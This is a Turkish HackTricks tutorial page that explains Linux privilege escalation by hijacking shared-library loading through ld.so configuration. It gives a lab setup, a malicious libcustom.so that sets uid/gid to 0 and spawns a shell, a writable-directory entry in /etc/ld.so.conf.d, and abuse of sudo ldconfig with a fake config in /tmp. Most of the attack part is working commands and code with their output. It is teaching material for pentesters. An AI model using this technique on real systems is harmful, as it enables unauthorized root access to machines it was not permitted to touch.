# ld.so privesc exploit örneği

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

## Ortamı Hazırlayın

Aşağıdaki bölümde, ortamı hazırlamak için kullanacağımız dosyaların kodunu bulabilirsiniz.

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **Bu dosyaları** makinenizde aynı klasörde **oluşturun**
2. **Kütüphaneyi** **derleyin**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`'yu `/usr/lib`'ye **kopyalayın**: `sudo cp libcustom.so /usr/lib` (root yetkileri)
4. **Çalıştırılabilir dosyayı** **derleyin**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ortamı kontrol et

_libcustom.so_'nun _/usr/lib_'den **yüklenip** yüklenmediğini ve ikili dosyayı **çalıştırıp** çalıştıramadığınızı kontrol edin.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

Bu senaryoda **birinin _/etc/ld.so.conf/_ içinde savunmasız bir giriş oluşturduğunu** varsayacağız:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Kırılgan klasör _/home/ubuntu/lib_ (yazılabilir erişimimizin olduğu yer).\
**Aşağıdaki kodu** o yolun içinde indirin ve derleyin:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Artık **yanlış yapılandırılmış** yol içinde kötü niyetli libcustom kütüphanesini **oluşturduğumuza göre**, bir **yeniden başlatma** veya root kullanıcısının **`ldconfig`** komutunu çalıştırmasını beklememiz gerekiyor (_eğer bu ikiliyi **sudo** olarak çalıştırabiliyorsanız veya **suid biti** varsa, bunu kendiniz çalıştırabileceksiniz_).

Bu gerçekleştiğinde, `sharevuln` yürütülebilir dosyasının `libcustom.so` kütüphanesini nereden yüklediğini **yeniden kontrol edin**:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Gördüğünüz gibi, **`/home/ubuntu/lib`'den yüklüyor** ve eğer herhangi bir kullanıcı bunu çalıştırırsa, bir shell çalıştırılacaktır:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Bu örnekte ayrıcalıkları yükseltmediğimizi, ancak yürütülen komutları değiştirerek ve **kök veya diğer ayrıcalıklı kullanıcıların savunmasız ikili dosyayı yürütmesini bekleyerek** ayrıcalıkları yükseltebileceğimizi unutmayın.
{% endhint %}

### Diğer yanlış yapılandırmalar - Aynı zafiyet

Önceki örnekte, bir yöneticinin **`/etc/ld.so.conf.d/` içindeki bir yapılandırma dosyasına ayrıcalıksız bir klasör ayarladığı** bir yanlış yapılandırmayı taklit ettik.\
Ancak, `/etc/ld.so.conf.d` içindeki bazı **yapılandırma dosyalarında** yazma izinleriniz varsa, `/etc/ld.so.conf.d` klasöründe veya `/etc/ld.so.conf` dosyasında aynı zafiyeti yapılandırabilir ve bunu istismar edebilirsiniz.

## İstismar 2

**`ldconfig` üzerinde sudo ayrıcalıklarınız olduğunu varsayalım**.\
`ldconfig`'e **konfigürasyon dosyalarının nereden yükleneceğini** belirtebilirsiniz, bu nedenle `ldconfig`'in keyfi klasörleri yüklemesini sağlamak için bunu avantaja çevirebiliriz.\
Şimdi, "/tmp" yüklemek için gereken dosya ve klasörleri oluşturalım:
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Şimdi, **önceki istismarda** belirtildiği gibi, **kötü niyetli kütüphaneyi `/tmp` içinde oluşturun**.\
Ve sonunda, yolu yükleyelim ve ikili dosyanın kütüphaneyi nereden yüklediğini kontrol edelim:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Gördüğünüz gibi, `ldconfig` üzerinde sudo ayrıcalıklarına sahip olduğunuzda aynı güvenlik açığını istismar edebilirsiniz.**

{% hint style="info" %}
{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
